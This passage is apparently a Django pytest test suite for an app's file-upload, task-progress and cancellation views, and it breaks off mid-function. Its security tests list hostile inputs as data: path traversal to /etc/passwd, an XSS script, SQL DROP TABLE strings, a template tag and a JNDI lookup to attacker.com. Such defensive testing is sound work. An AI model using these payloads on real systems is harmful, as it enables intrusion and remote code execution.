import pytest
import json
from unittest.mock import patch, MagicMock, call, PropertyMock
from django.core.files.uploadedfile import SimpleUploadedFile
from django.urls import reverse
from django.contrib import messages
from celery.result import AsyncResult
from django_celery_results.models import TaskResult
from agregator.views.utils import get_user_tasks

from agregator.models import UserTasks, Act, ScientificReport, TechReport, User


@pytest.mark.django_db
class TestFileProcessingViews:
    """Тесты для обработки файлов"""

    @pytest.mark.parametrize('view_name, template_name', [
        ('deconstructor', 'deconstructor.html'),
        ('external_sources', 'external_sources.html'),
        ('open_list_ocr', 'open_list_ocr.html'),
        ('account_cards_upload', 'account_cards_upload.html'),
        ('commercial_offers_upload', 'commercial_offers_upload.html'),
        ('geo_objects_upload', 'geo_object_upload.html'),
    ])
    def test_file_processing_views_get_authenticated(self, client, test_user, view_name, template_name):
        """Тест GET запросов для авторизованного пользователя"""
        client.login(username='testuser', password='testpass123')

        response = client.get(reverse(view_name))

        assert response.status_code == 200
        assert template_name in [t.name for t in response.templates]

    @pytest.mark.parametrize('view_name', [
        'deconstructor',
        'external_sources',
        'open_list_ocr',
        'account_cards_upload',
        'commercial_offers_upload',
        'geo_objects_upload',
    ])
    def test_file_processing_views_get_unauthenticated(self, client, view_name):
        """Тест GET запросов для неавторизованного пользователя"""
        response = client.get(reverse(view_name))

        assert response.status_code == 302  # Редирект на логин

    @pytest.mark.parametrize('file_type, upload_type, storage_type', [
        ('act', 'fully', 'public'),
        ('act', 'mixed', 'private'),
        ('scientific_report', 'fully', 'private'),
        ('scientific_report', 'mixed', 'public'),
        ('tech_report', 'fully', 'public'),
        ('tech_report', 'mixed', 'private'),
    ])
    @patch('agregator.views.file_processing.raw_reports_save')
    @patch('agregator.views.file_processing.process_acts')
    @patch('agregator.views.file_processing.process_scientific_reports')
    @patch('agregator.views.file_processing.process_tech_reports')
    def test_deconstructor_post_valid_data(self, mock_process_tech, mock_process_scientific, mock_process_acts,
                                           mock_raw_save, client, test_user, file_type, upload_type, storage_type):
        """Тест POST запросов deconstructor с валидными данными"""
        client.login(username='testuser', password='testpass123')

        # Создаем тестовые файлы
        files = [
            SimpleUploadedFile(f"test_{i}.pdf", b"file_content", content_type="application/pdf")
            for i in range(3)
        ]

        # Настраиваем моки
        mock_raw_save.return_value = [1, 2, 3]
        mock_task = MagicMock()
        mock_task.task_id = 'test-task-id'

        if file_type == 'act':
            mock_process_acts.apply_async.return_value = mock_task
        elif file_type == 'scientific_report':
            mock_process_scientific.apply_async.return_value = mock_task
        elif file_type == 'tech_report':
            mock_process_tech.apply_async.return_value = mock_task

        post_data = {
            'file_type': file_type,
            'upload_type': upload_type,
            'storage_type': storage_type,
            'select_text': 'on',
            'select_image': 'on',
            'select_coord': 'on',
        }

        # Правильная передача файлов в Django тестовом клиенте
        response = client.post(
            reverse('deconstructor'),
            {**post_data, 'files': files},
            format='multipart'
        )

        assert response.status_code == 200
        assert mock_raw_save.called

        # Проверяем что задача была создана
        if file_type == 'act':
            mock_process_acts.apply_async.assert_called_once()
        elif file_type == 'scientific_report':
            mock_process_scientific.apply_async.assert_called_once()
        elif file_type == 'tech_report':
            mock_process_tech.apply_async.assert_called_once()

        # Проверяем что UserTask был создан
        assert UserTasks.objects.filter(task_id='test-task-id', files_type=file_type).exists()

    @pytest.mark.parametrize('file_type', ['act', 'scientific_report', 'tech_report'])
    @patch('agregator.views.file_processing.raw_reports_save')
    def test_deconstructor_post_no_files(self, mock_raw_save, client, test_user, file_type):
        """Тест POST запросов deconstructor без файлов"""
        client.login(username='testuser', password='testpass123')

        # Мокаем функцию сохранения чтобы избежать ошибок в коде
        mock_raw_save.return_value = []

        post_data = {
            'file_type': file_type,
            'upload_type': 'fully',
            'storage_type': 'private',
        }

        response = client.post(
            reverse('deconstructor'),
            post_data
        )

        assert response.status_code == 200
        # Должен вернуть форму с ошибками

    @patch('agregator.views.file_processing.external_sources_processing')
    def test_external_sources_post_valid(self, mock_external_processing, client, test_user):
        """Тест POST запросов external_sources с валидными данными"""
        client.login(username='testuser', password='testpass123')

        mock_task = MagicMock()
        mock_task.id = 'external-task-id'
        mock_external_processing.delay.return_value = mock_task

        post_data = {
            'enableDateRange': 'on',
            'startDate': '01-01-2023',
            'endDate': '31-12-2023',
            'select_text': 'on',
            'select_image': 'on',
            'select_coord': 'on',
        }

        response = client.post(reverse('external_sources'), post_data)

        assert response.status_code == 200
        mock_external_processing.delay.assert_called_once()
        assert 'external-task-id' in response.content.decode()

    @patch('agregator.views.file_processing.get_scan_task')
    def test_external_sources_already_processing(self, mock_get_scan_task, client, test_user):
        """Тест external_sources когда задача уже выполняется"""
        client.login(username='testuser', password='testpass123')

        mock_get_scan_task.return_value = (True, 'existing-task-id', MagicMock())

        response = client.get(reverse('external_sources'))

        assert response.status_code == 200
        assert 'existing-task-id' in response.content.decode()

    @pytest.mark.parametrize('task_state, expected_state', [
        ('PENDING', 'PENDING'),
        ('PROGRESS', 'PROGRESS'),
        ('SUCCESS', 'SUCCESS'),
        ('FAILURE', 'FAILURE'),
        ('REVOKED', 'REVOKED'),
    ])
    @patch('agregator.views.file_processing.AsyncResult')
    def test_check_external_scan_progress(self, mock_async_result, client, test_user, task_state, expected_state):
        """Тест проверки прогресса внешнего сканирования"""
        client.login(username='testuser', password='testpass123')

        # Мокаем AsyncResult
        mock_task = MagicMock()
        mock_task.state = task_state
        if task_state == 'SUCCESS':
            mock_task.result = {'message': 'test result'}  # ОК, сериализуемый словарь
        elif task_state == 'PROGRESS':
            mock_task.result = {'current': 50, 'total': 100}  # Добавить реальный словарь, а не MagicMock
        elif task_state in ['FAILURE', 'REVOKED']:
            mock_task.info = "Test error"
        else:
            mock_task.result = None  # Для других состояний
        mock_async_result.return_value = mock_task
        task_id = 'test-task-id'
        response = client.get(reverse('check_external_scan_progress', kwargs={'task_id': task_id}))

        assert response.status_code == 200
        data = json.loads(response.content)
        assert data['state'] == expected_state

    def test_check_external_scan_progress_nonexistent(self, client, test_user):
        """Тест проверки прогресса несуществующей задачи"""
        client.login(username='testuser', password='testpass123')

        response = client.get(reverse('check_external_scan_progress', kwargs={'task_id': 'nonexistent-task'}))

        assert response.status_code == 200
        data = json.loads(response.content)
        assert data['state'] == 'PENDING'

    @patch('agregator.views.file_processing.AsyncResult')
    def test_cancel_external_scan_task(self, mock_async_result, client, test_user):
        """Тест отмены внешней задачи сканирования"""
        client.login(username='testuser', password='testpass123')

        task_id = 'test-task-id'
        mock_task = MagicMock()
        mock_async_result.return_value = mock_task

        # Создаем запись в базе
        TaskResult.objects.create(
            task_id=task_id,
            status='PROGRESS',
            result='{}'
        )

        response = client.post(reverse('cancel_external_scan_task', kwargs={'task_id': task_id}))

        assert response.status_code == 200
        mock_task.revoke.assert_called_once_with(terminate=True)

        # Проверяем что статус обновлен в базе
        task = TaskResult.objects.get(task_id=task_id)
        assert task.status == 'REVOKED'

    @pytest.mark.parametrize('report_type, model_class, fields', [
        ('act', Act, {'name_number': 'Test act', 'year': '2023'}),
        ('scientific_report', ScientificReport, {'name': 'Test scientific_report'}),
        ('tech_report', TechReport, {'name': 'Test tech_report'}),
    ])
    @patch('agregator.views.file_processing.process_acts')
    @patch('agregator.views.file_processing.process_scientific_reports')
    @patch('agregator.views.file_processing.process_tech_reports')
    def test_doc_reprocess(self, mock_process_tech, mock_process_scientific, mock_process_acts,
                           client, test_user, report_type, model_class, fields):
        """Тест повторной обработки документа"""
        client.login(username='testuser', password='testpass123')

        # Создаем тестовый документ с правильными полями
        doc = model_class.objects.create(user=test_user, **fields)

        mock_task = MagicMock()
        mock_task.task_id = 'reprocess-task-id'

        if report_type == 'act':
            mock_process_acts.apply_async.return_value = mock_task
        elif report_type == 'scientific_report':
            mock_process_scientific.apply_async.return_value = mock_task
        elif report_type == 'tech_report':
            mock_process_tech.apply_async.return_value = mock_task

        post_data = {
            'select_text': 'on',
            'select_image': 'on',
            'select_coord': 'on',
        }

        response = client.post(
            reverse('doc_reprocess', kwargs={'pk': doc.id}),
            post_data,
            HTTP_REFERER=f'http://testserver/{report_type}s/{doc.id}/'
        )

        assert response.status_code == 200

        # Проверяем что задача была создана
        if report_type == 'act':
            mock_process_acts.apply_async.assert_called_once()
        elif report_type == 'scientific_report':
            mock_process_scientific.apply_async.assert_called_once()
        elif report_type == 'tech_report':
            mock_process_tech.apply_async.assert_called_once()

        # Проверяем что UserTask был создан
        assert UserTasks.objects.filter(task_id='reprocess-task-id', files_type=report_type).exists()

    def test_doc_reprocess_invalid_referer(self, client, test_user, test_act):
        """Тест повторной обработки с неверным referer"""
        client.login(username='testuser', password='testpass123')

        response = client.post(
            reverse('doc_reprocess', kwargs={'pk': test_act.id}),
            {},
            HTTP_REFERER='http://testserver/invalid/1/'
        )

        assert response.status_code == 404

    def test_download_delete(self, client, test_user, test_tasks):
        """Тест удаления задачи"""
        client.login(username='testuser', password='testpass123')

        task = test_tasks[0]

        response = client.post(reverse('download_delete', kwargs={'task_id': task.task_id}))

        assert response.status_code == 200
        data = json.loads(response.content)
        assert data['response'] == 'deleted'

        # Проверяем что задача удалена
        assert not UserTasks.objects.filter(task_id=task.task_id).exists()
        assert not TaskResult.objects.filter(task_id=task.task_id).exists()

    def test_download_delete_nonexistent(self, client, test_user):
        """Тест удаления несуществующей задачи"""
        client.login(username='testuser', password='testpass123')

        response = client.post(reverse('download_delete', kwargs={'task_id': 'nonexistent-task'}))

        assert response.status_code == 200

    # Тесты безопасности
    @pytest.mark.parametrize('view_name', [
        'deconstructor',
        'external_sources',
        'open_list_ocr',
        'account_cards_upload',
        'commercial_offers_upload',
        'geo_objects_upload',
    ])
    def test_csrf_protection(self, client, test_user, view_name):
        """Тест защиты CSRF"""
        client.login(username='testuser', password='testpass123')

        # Создаем клиент с включенной проверкой CSRF
        csrf_client = client
        csrf_client.enforce_csrf_checks = True

        response = csrf_client.post(
            reverse(view_name),
            {},
            follow=True
        )

        # Должен вернуть ошибку CSRF или редирект (в зависимости от настройки)
        assert response.status_code in [403, 200]

    @pytest.mark.parametrize('task_id', [
        '-1',
        '9999999',
        '0',
        '1+1',
        'invalid',
        'test; DROP TABLE users;'
    ])
    def test_sql_injection_protection(self, client, test_user, task_id):
        """Тест защиты от SQL инъекций в параметрах задач"""
        client.login(username='testuser', password='testpass123')

        response = client.get(reverse('check_external_scan_progress', kwargs={'task_id': task_id}))

        # Должен корректно обработать невалидный task_id
        assert response.status_code in [200, 404]

    @patch('agregator.views.file_processing.AsyncResult')
    def test_cancel_external_scan_task_exception_handling(self, mock_async_result, client, test_user):
        """Тест обработки исключений при отмене задачи"""
        client.login(username='testuser', password='testpass123')

        # Настраиваем мок чтобы вызвать исключение
        mock_async_result.side_effect = Exception("Revoke failed")

        response = client.post(reverse('cancel_external_scan_task', kwargs={'task_id': 'test-task'}))

        assert response.status_code == 200
        data = json.loads(response.content)
        assert 'error' in data['status']


@pytest.mark.django_db
class TestFileProcessingEdgeCases:
    """Тесты граничных случаев для обработки файлов"""

    @pytest.mark.parametrize('file_name, expected_type', [
        ('текст_report.pdf', 'text'),
        ('приложение_doc.pdf', 'images'),
        ('иллюстрации_file.pdf', 'images'),
        ('report.pdf', 'all'),  # Без указания типа
        ('', 'all'),  # Пустое имя файла
    ])
    def test_file_type_detection(self, file_name, expected_type):
        """Тест определения типа файла по имени"""
        from agregator.views.file_processing import deconstructor

        # Тестируем логику определения типа
        types_convert = {'текст': 'text', 'приложение': 'images', 'иллюстрации': 'images'}
        detected_type = 'all'

        if file_name:
            filename = file_name.lower()
            for typename in types_convert.keys():
                if typename in filename:
                    detected_type = types_convert[typename]
                    break

        assert detected_type == expected_type

    def test_concurrent_file_processing(self, client, test_user):
        """Тест конкурентной обработки файлов"""
        client.login(username='testuser', password='testpass123')

        # Создаем несколько задач одновременно
        tasks = []
        for i in range(5):
            task = UserTasks.objects.create(
                user=test_user,
                task_id=f'test_concurrent_{i}',
                files_type='act',
                upload_source={'source': 'Пользовательский файл'}
            )
            tasks.append(task)

        # Проверяем что все задачи созданы
        assert UserTasks.objects.filter(user=test_user).count() == 5

    @patch('agregator.views.file_processing.raw_reports_save')
    def test_file_processing_error_handling(self, mock_raw_save, client, test_user):
        """Тест обработки ошибок при обработке файлов"""
        client.login(username='testuser', password='testpass123')

        # Настраиваем мок чтобы вызвать исключение
        mock_raw_save.side_effect = Exception("File processing error")

        files = [SimpleUploadedFile("test.pdf", b"file_content", content_type="application/pdf")]

        response = client.post(
            reverse('deconstructor'),
            {
                'file_type': 'act',
                'upload_type': 'fully',
                'storage_type': 'private',
                'files': files
            },
            format='multipart'
        )

        # Должен вернуть форму с ошибкой
        assert response.status_code == 200
        assert 'form' in response.context

    @patch('agregator.views.file_processing.external_sources_processing')
    def test_external_sources_invalid_dates(self, mock_external_processing, client, test_user):
        """Тест external_sources с невалидными датами"""
        client.login(username='testuser', password='testpass123')

        mock_task = MagicMock()
        mock_task.id = 'external-task-id'
        mock_external_processing.delay.return_value = mock_task

        post_data = {
            'enableDateRange': 'on',
            'startDate': 'invalid-date',
            'endDate': 'another-invalid',
            'select_text': 'on',
        }

        response = client.post(reverse('external_sources'), post_data)

        # Должен обработать невалидные даты
        assert response.status_code == 200
        mock_external_processing.delay.assert_called_once()

    @patch('agregator.views.file_processing.raw_reports_save')
    def test_deconstructor_exception_handling_detailed(self, mock_raw_save, client, test_user):
        """Детальный тест обработки исключений в deconstructor с разными сценариями"""
        client.login(username='testuser', password='testpass123')

        # Тест 1: Исключение при сохранении файлов
        mock_raw_save.side_effect = Exception("File save error")

        files = [SimpleUploadedFile("test.pdf", b"file_content", content_type="application/pdf")]

        response = client.post(
            reverse('deconstructor'),
            {
                'file_type': 'act',
                'upload_type': 'fully',
                'storage_type': 'private',
                'select_text': 'on',
                'files': files
            },
            format='multipart'
        )

        assert response.status_code == 200
        assert 'form' in response.context
        assert 'Ошибка при сохранении файлов' in response.content.decode()

    @patch('agregator.views.file_processing.raw_reports_save')
    def test_deconstructor_mixed_upload_type_empty_files(self, mock_raw_save, client, test_user):
        """Тест mixed upload type с пустыми uploaded_files"""
        client.login(username='testuser', password='testpass123')

        # Файлы без ключевых слов в именах - должны остаться в uploaded_files
        files = [
            SimpleUploadedFile("report1.pdf", b"content", content_type="application/pdf"),
            SimpleUploadedFile("document2.pdf", b"content", content_type="application/pdf")
        ]

        mock_raw_save.return_value = [1, 2]

        response = client.post(
            reverse('deconstructor'),
            {
                'file_type': 'act',
                'upload_type': 'mixed',
                'storage_type': 'private',
                'select_text': 'on',
                'files': files
            },
            format='multipart'
        )

        assert response.status_code == 200
        assert mock_raw_save.called

    def test_deconstructor_get_acts_form(self, client, test_user):
        """Тест GET запроса с параметром acts"""
        client.login(username='testuser', password='testpass123')

        response = client.get(reverse('deconstructor') + '?acts=true')

        assert response.status_code == 200
        assert 'form' in response.context

    @patch('agregator.views.file_processing.external_sources_processing')
    def test_external_sources_date_parsing_errors(self, mock_processing, client, test_user):
        """Тест обработки невалидных дат в external_sources"""
        client.login(username='testuser', password='testpass123')

        mock_task = MagicMock()
        mock_task.id = 'test-task-id'
        mock_processing.delay.return_value = mock_task

        # Тест с невалидными датами
        post_data = {
            'enableDateRange': 'on',
            'startDate': 'invalid-date-format',
            'endDate': 'another-invalid',
            'select_text': 'on',
        }

        response = client.post(reverse('external_sources'), post_data)

        assert response.status_code == 200
        # Должен вызвать обработку даже с невалидными датами
        mock_processing.delay.assert_called_once()

    def test_external_sources_no_admin_user(self, client, test_user):
        """Тест external_sources когда нет admin пользователя"""
        client.login(username='testuser', password='testpass123')

        # Удаляем всех админов
        User.objects.filter(is_superuser=True).delete()

        response = client.get(reverse('external_sources'))

        assert response.status_code == 200
        # Должен использовать текущего пользователя как fallback
        assert 'tasks_id' in response.context

    from unittest.mock import PropertyMock

    @patch('agregator.views.file_processing.AsyncResult')
    def test_check_external_scan_progress_database_fallback(self, mock_async_result, client, test_user):
        """Тест fallback на базу данных при ошибке AsyncResult"""
        client.login(username='testuser', password='testpass123')

        # Создаем мок задачи, который вызывает исключение при обращении к state
        mock_task = MagicMock()
        # Правильно настраиваем side_effect для свойства state
        type(mock_task).state = PropertyMock(side_effect=Exception("AsyncResult error"))

        mock_async_result.return_value = mock_task

        # Создаем запись в базе
        task_id = 'test-task-id'
        TaskResult.objects.create(
            task_id=task_id,
            status='PROGRESS',
            result='{"current": 5, "total": 10}'
        )

        response = client.get(reverse('check_external_scan_progress', kwargs={'task_id': task_id}))

        assert response.status_code == 200
        data = json.loads(response.content)
        assert data['state'] == 'PROGRESS'

    @patch('agregator.views.file_processing.AsyncResult')
    def test_check_external_scan_progress_complete_failure(self, mock_async_result, client, test_user):
        """Тест полного отказа системы проверки прогресса"""
        client.login(username='testuser', password='testpass123')

        # Настраиваем полный отказ
        mock_async_result.side_effect = Exception("Complete system failure")

        response = client.get(reverse('check_external_scan_progress', kwargs={'task_id': 'test-task'}))

        assert response.status_code == 200
        data = json.loads(response.content)
        assert data['state'] == 'ERROR'

    def test_doc_reprocess_invalid_report_type(self, client, test_user, test_act):
        """Тест повторной обработки с неверным типом отчета в referer"""
        client.login(username='testuser', password='testpass123')

        response = client.post(
            reverse('doc_reprocess', kwargs={'pk': test_act.id}),
            {'select_text': 'on'},
            HTTP_REFERER='http://testserver/invalid_type/1/'
        )

        assert response.status_code == 404

    def test_doc_reprocess_no_referer(self, client, test_user, test_act):
        """Тест повторной обработки без referer"""
        client.login(username='testuser', password='testpass123')

        response = client.post(
            reverse('doc_reprocess', kwargs={'pk': test_act.id}),
            {'select_text': 'on'}
            # No HTTP_REFERER
        )

        assert response.status_code == 404

    def test_download_delete_task_result_not_found(self, client, test_user, test_tasks):
        """Тест удаления задачи когда TaskResult не существует"""
        client.login(username='testuser', password='testpass123')

        task = test_tasks[0]
        # Удаляем TaskResult но оставляем UserTasks
        TaskResult.objects.filter(task_id=task.task_id).delete()

        response = client.post(reverse('download_delete', kwargs={'task_id': task.task_id}))

        assert response.status_code == 200
        data = json.loads(response.content)
        assert data['response'] == 'deleted'
        # UserTask должен быть удален
        assert not UserTasks.objects.filter(task_id=task.task_id).exists()

    @patch('agregator.views.file_processing.get_object_or_404')
    def test_download_delete_exception_handling(self, mock_get_object, client, test_user):
        """Тест обработки исключений при удалении задачи"""
        client.login(username='testuser', password='testpass123')

        mock_get_object.side_effect = Exception("Database error")

        response = client.post(reverse('download_delete', kwargs={'task_id': 'test-task'}))

        assert response.status_code == 200

    @pytest.mark.parametrize('filename, expected_type', [
        ('текст_отчет.pdf', 'text'),
        ('приложение_документ.pdf', 'images'),
        ('иллюстрации_файл.pdf', 'images'),
        ('обычный_файл.pdf', 'all'),
        ('', 'all'),
        (None, 'all'),
    ])
    def test_file_type_detection_edge_cases(self, filename, expected_type):
        """Тест определения типа файла для граничных случаев"""
        from agregator.views.file_processing import deconstructor

        detected_type = 'all'
        if filename:
            filename_lower = filename.lower()
            types_convert = {'текст': 'text', 'приложение': 'images', 'иллюстрации': 'images'}
            for typename in types_convert.keys():
                if typename in filename_lower:
                    detected_type = types_convert[typename]
                    break

        assert detected_type == expected_type

    @patch('agregator.views.file_processing.raw_reports_save')
    def test_deconstructor_empty_file_groups(self, mock_raw_save, client, test_user):
        """Тест deconstructor с пустыми группами файлов"""
        client.login(username='testuser', password='testpass123')

        # Файлы без ключевых слов в mixed mode
        files = [SimpleUploadedFile("test.pdf", b"content", content_type="application/pdf")]
        mock_raw_save.return_value = [1]

        response = client.post(
            reverse('deconstructor'),
            {
                'file_type': 'act',
                'upload_type': 'mixed',
                'storage_type': 'private',
                'select_text': 'on',
                'files': files
            },
            format='multipart'
        )

        assert response.status_code == 200
        assert mock_raw_save.called

    def test_get_scan_task_no_active_task(self):
        """Тест get_scan_task когда нет активной задачи"""
        from agregator.views.file_processing import get_scan_task

        # Убедимся что нет активных задач
        TaskResult.objects.filter(status='PROGRESS').delete()

        is_processing, task_id, active_task = get_scan_task('test.task')

        assert not is_processing
        assert task_id is None
        assert active_task is None

    @patch('agregator.views.file_processing.TaskResult.objects.filter')
    def test_get_scan_task_exception_handling(self, mock_filter):
        """Тест обработки исключений в get_scan_task"""
        from agregator.views.file_processing import get_scan_task

        mock_filter.side_effect = Exception("Database error")

        is_processing, task_id, active_task = get_scan_task('test.task')

        # Должен вернуть значения по умолчанию при ошибке
        assert not is_processing
        assert task_id is None
        assert active_task is None


@pytest.mark.django_db
class TestFileProcessingIntegration:
    """Интеграционные тесты для обработки файлов"""

    @patch('agregator.views.file_processing.raw_reports_save')
    @patch('agregator.views.file_processing.process_acts')
    def test_full_deconstructor_flow(self, mock_process_acts, mock_raw_save, client, test_user):
        """Полный тест потока deconstructor: GET форма -> POST данных -> создание задачи"""
        client.login(username='testuser', password='testpass123')

        # 1. Получаем форму
        response = client.get(reverse('deconstructor'))
        assert response.status_code == 200
        assert 'deconstructor.html' in [t.name for t in response.templates]

        # 2. Отправляем файлы
        files = [SimpleUploadedFile("test.pdf", b"file_content", content_type="application/pdf")]
        mock_raw_save.return_value = [1]
        mock_task = MagicMock()
        mock_task.task_id = 'test-task-id'
        mock_process_acts.apply_async.return_value = mock_task

        data = {
            'file_type': 'act',
            'upload_type': 'fully',
            'storage_type': 'private',
            'select_text': 'on',
            'select_image': 'on',
            'select_coord': 'on',
        }

        response = client.post(
            reverse('deconstructor'),
            data,
            format='multipart',
            files={'files': files}
        )

        # 3. Проверяем что задача создана
        assert response.status_code == 200
        mock_process_acts.apply_async.assert_called_once()
        assert UserTasks.objects.filter(task_id='test-task-id').exists()
        TaskResult.objects.create(task_id='test-task-id', status='PENDING', result='{}')

        # Получаем tasks_id заново
        tasks_id = get_user_tasks(test_user.id, ('act', 'scientific_report', 'tech_report'))
        assert 'test-task-id' in tasks_id

        # 4. Проверяем что можем посмотреть статус задачи
        response = client.get(reverse('deconstructor'))
        assert response.status_code == 200
        assert 'test-task-id' in response.content.decode()

    def test_external_sources_full_flow(self, client, test_user, admin_user):
        """Полный тест потока external_sources"""
        client.login(username='testuser', password='testpass123')

        # 1. Получаем форму
        response = client.get(reverse('external_sources'))
        assert response.status_code == 200

        # 2. Создаем задачу сканирования (мокаем)
        with patch('agregator.views.file_processing.external_sources_processing') as mock_processing:
            mock_task = MagicMock()
            mock_task.id = 'external-task-id'
            mock_processing.delay.return_value = mock_task

            response = client.post(
                reverse('external_sources'),
                {
                    'enableDateRange': 'on',
                    'startDate': '01-01-2023',
                    'endDate': '31-12-2023',
                    'select_text': 'on',
                }
            )

            assert response.status_code == 200
            mock_processing.delay.assert_called_once()

        # 3. Проверяем прогресс задачи
        TaskResult.objects.create(
            task_id='external-task-id',
            status='PROGRESS',
            result='{"current": 1, "total": 10}'
        )

        response = client.get(reverse('check_external_scan_progress', kwargs={'task_id': 'external-task-id'}))
        assert response.status_code == 200
        data = json.loads(response.content)
        assert data['state'] == 'PROGRESS'

        # 4. Отменяем задачу
        with patch('agregator.views.file_processing.AsyncResult') as mock_async:
            mock_task = MagicMock()
            mock_async.return_value = mock_task

            response = client.post(reverse('cancel_external_scan_task', kwargs={'task_id': 'external-task-id'}))
            assert response.status_code == 200
            mock_task.revoke.assert_called_once()


@pytest.mark.django_db
class TestFileProcessingPerformance:
    """Тесты производительности для обработки файлов"""

    def test_multiple_file_upload_performance(self, client, test_user):
        """Тест производительности при загрузке множества файлов"""
        client.login(username='testuser', password='testpass123')

        import time

        # Создаем 10 файлов
        files = [
            SimpleUploadedFile(f"test_{i}.pdf", b"x" * 1024, content_type="application/pdf")
            for i in range(10)
        ]

        # Измеряем время обработки
        start_time = time.time()

        data = {
            'file_type': 'act',
            'upload_type': 'fully',
            'storage_type': 'private',
        }

        response = client.post(
            reverse('deconstructor'),
            data,
            format='multipart',
            files={'files': files}
        )

        end_time = time.time()

        assert response.status_code == 200
        # Время обработки должно быть меньше 2 секунд
        assert (end_time - start_time) < 2.0

    def test_concurrent_access_performance(self, client, test_user):
        """Тест производительности при конкурентном доступе"""
        client.login(username='testuser', password='testpass123')

        import time

        results = []

        # Делаем 5 последовательных запросов
        for i in range(5):
            start_time = time.time()
            response = client.get(reverse('deconstructor'))
            end_time = time.time()
            results.append((response.status_code, end_time - start_time))

        # Проверяем что все запросы успешны и время ответа приемлемое
        for status_code, response_time in results:
            assert status_code == 200
            assert response_time < 1.0  # Каждый запрос должен быть быстрым


@pytest.mark.django_db
class TestFileProcessingSecurity:
    @pytest.mark.parametrize('malicious_input', [
        '../../etc/passwd',
        '<script>alert("xss")</script>',
        '; DROP TABLE users;',
        '${jndi:ldap://attacker.com/exploit}',
        '{% debug %}',
    ])
    def test_malicious_filename_handling(self, client, test_user, malicious_input):
        """Тест обработки malicious имен файлов"""
        client.login(username='testuser', password='testpass123')

        files = [SimpleUploadedFile(malicious_input, b"content", content_type="application/pdf")]

        with patch('agregator.views.file_processing.raw_reports_save') as mock_save:
            mock_save.return_value = [1]

            response = client.post(
                reverse('deconstructor'),
                {
                    'file_type': 'act',
                    'upload_type': 'fully',
                    'storage_type': 'private',
                    'select_text': 'on',
                    'files': files
                },
                format='multipart'
            )

        # Должен обработать без ошибок безопасности
        assert response.status_code in [200, 302]


@pytest.mark.django_db
class TestFileProcessingAdditionalCoverage:
    """Дополнительные тесты для покрытия оставшихся строк"""

    def test_deconstructor_acts_button(self, client, test_user):
        """Тест нажатия кнопки 'acts' в deconstructor (строки 44-45)"""
        client.login(username='testuser', password='testpass123')

        response = client.post(reverse('deconstructor'), {'acts': 'true'})

        assert response.status_code == 200
        assert 'form' in response.context

    def test_deconstructor_superuser_public_storage(self, client, admin_user):
        """Тест строки 56: суперпользователь выбирает публичное хранилище"""
        client.login(username='admin', password='adminpass123')

        files = [SimpleUploadedFile("test.pdf", b"content", "application/pdf")]

        with patch('agregator.views.file_processing.raw_reports_save') as mock_save, \
                patch('agregator.views.file_processing.process_acts') as mock_process:
            mock_save.return_value = [1]
            mock_task = MagicMock()
            mock_task.task_id = 'test-task-id'
            mock_process.apply_async.return_value = mock_task

            response = client.post(
                reverse('deconstructor'),
                {
                    'file_type': 'act',
                    'upload_type': 'fully',
                    'storage_type': 'public',  # Это вызовет строку 56
                    'select_text': 'on',
                    'files': files
                },
                format='multipart'
            )

            assert response.status_code == 200
            # Проверяем что raw_reports_save вызвана с is_public=True
            mock_save.assert_called_once()
            args, kwargs = mock_save.call_args
            assert args[4] is True  # is_public должен быть True

    @patch('agregator.views.file_processing.AsyncResult')
    def test_check_external_scan_progress_db_exceptions(self, mock_async_result, client, test_user):
        """Тест строк 200-205: исключения при работе с базой данных"""
        client.login(username='testuser', password='testpass123')

        # Мокаем AsyncResult чтобы вызвать исключение при обращении к state
        mock_task = MagicMock()

        # Создаем свойство state, которое вызывает исключение
        def state_side_effect():
            raise Exception("AsyncResult error")

        type(mock_task).state = property(state_side_effect)
        mock_async_result.return_value = mock_task

        task_id = 'test-task-id'

        # 1. Тест TaskResult.DoesNotExist (строка 201-202)
        response = client.get(reverse('check_external_scan_progress', kwargs={'task_id': task_id}))
        assert response.status_code == 200
        data = json.loads(response.content)
        assert data['state'] == 'PENDING'

        # 2. Тест другого исключения базы данных (строки 203-204)
        with patch('agregator.views.file_processing.TaskResult.objects.get') as mock_get:
            mock_get.side_effect = Exception("Database connection error")

            response = client.get(reverse('check_external_scan_progress', kwargs={'task_id': task_id}))
            assert response.status_code == 200
            data = json.loads(response.content)
            assert data['state'] == 'UNKNOWN'

    def test_deconstructor_fully_upload_text_file(self, client, test_user):
        """Тест покрывает строки 69-72: загрузка файла с 'текст' в имени"""
        client.login(username='testuser', password='testpass123')

        text_file = SimpleUploadedFile(
            "отчет_текст.pdf",
            b"file_content",
            "application/pdf"
        )

        with patch('agregator.views.file_processing.raw_reports_save') as mock_save, \
                patch('agregator.views.file_processing.process_acts') as mock_process:
            mock_save.return_value = [1]
            mock_task = MagicMock()
            mock_task.task_id = 'test-task-id'
            mock_process.apply_async.return_value = mock_task

            response = client.post(
                reverse('deconstructor'),
                {
                    'file_type': 'act',
                    'upload_type': 'fully',
                    'select_text': 'on',
                    'files': [text_file]
                },
                format='multipart'
            )

            assert response.status_code == 200
            mock_save.assert_called_once()

    def test_deconstructor_mixed_upload_supplement_file(self, client, test_user):
        """Тест покрывает строки 82-89: загрузка файла с 'приложение' в имени"""
        client.login(username='testuser', password='testpass123')

        supplement_file = SimpleUploadedFile(
            "приложение_док1.pdf",
            b"file_content",
            "application/pdf"
        )

        with patch('agregator.views.file_processing.raw_reports_save') as mock_save, \
                patch('agregator.views.file_processing.process_acts') as mock_process:
            mock_save.return_value = [1]
            mock_task = MagicMock()
            mock_task.task_id = 'test-task-id'
            mock_process.apply_async.return_value = mock_task

            response = client.post(
                reverse('deconstructor'),
                {
                    'file_type': 'act',
                    'upload_type': 'mixed',
                    'select_text': 'on',
                    'files': [supplement_file]
                },
                format='multipart'
            )

            assert response.status_code == 200
            mock_save.assert_called_once()

    def test_deconstructor_mixed_upload_existing_group(self, client, test_user):
        """Тест покрывает строки 91-94: добавление файла в существующую группу"""
        client.login(username='testuser', password='testpass123')

        file1 = SimpleUploadedFile("группа_приложение.pdf", b"content1", "application/pdf")
        file2 = SimpleUploadedFile("группа_текст.pdf", b"content2", "application/pdf")

        with patch('agregator.views.file_processing.raw_reports_save') as mock_save, \
                patch('agregator.views.file_processing.process_acts') as mock_process:
            mock_save.return_value = [1]
            mock_task = MagicMock()
            mock_task.task_id = 'test-task-id'
            mock_process.apply_async.return_value = mock_task

            response = client.post(
                reverse('deconstructor'),
                {
                    'file_type': 'act',
                    'upload_type': 'mixed',
                    'select_text': 'on',
                    'files': [file1, file2]
                },
                format='multipart'
            )

            assert response.status_code == 200
            mock_save.assert_called_once()

    def test_deconstructor_invalid_form(self, client, test_user):
